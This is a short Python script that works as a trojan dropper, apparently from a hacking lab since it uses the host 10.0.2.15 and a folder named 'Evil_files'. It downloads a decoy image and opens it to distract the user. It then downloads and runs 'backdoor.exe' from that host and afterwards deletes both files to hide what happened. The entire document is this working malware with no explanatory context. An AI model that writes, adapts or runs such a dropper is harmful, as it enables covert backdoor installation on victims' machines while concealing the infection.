#!/usr/bin/env python

import subprocess
import tempfile
import os
import requests

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://10.0.2.15/Evil_files/lupi.jpg")
subprocess.Popen("lupi.jpg", shell=True)

download("http://10.0.2.15/Evil_files/backdoor.exe")
subprocess.call("backdoor.exe", shell=True)

os.remove("lupi.jpg")
os.remove("backdoor.exe")
